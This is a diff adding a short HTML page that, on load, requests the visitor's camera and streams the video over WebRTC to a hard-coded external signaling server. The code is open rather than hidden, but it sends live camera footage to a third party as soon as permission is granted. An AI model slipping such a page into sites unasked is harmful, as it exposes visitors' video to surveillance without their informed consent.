@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
+</head>
+<body>
+    <h1>Camera Access Page</h1>
+    <video id="localVideo" autoplay playsinline></video>
+    <script>
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('localVideo').srcObject = stream;
+                
+                // Set up a connection to send the stream to the other website
+                const peerConnection = new RTCPeerConnection();
+                stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
+
+                // Replace with your signaling server URL
+                const signalingServerUrl = 'wss://electric-jelene-jxo-beta-api-8cdbeb85.koyeb.app/';
+                const socket = new WebSocket(signalingServerUrl);
+
+                socket.onopen = () => {
+                    peerConnection.createOffer().then(offer => {
+                        peerConnection.setLocalDescription(offer);
+                        socket.send(JSON.stringify({ offer }));
+                    });
+                };
+
+                socket.onmessage = (message) => {
+                    const data = JSON.parse(message.data);
+                    if (data.answer) {
+                        peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
+                    }
+                };
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+            }
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
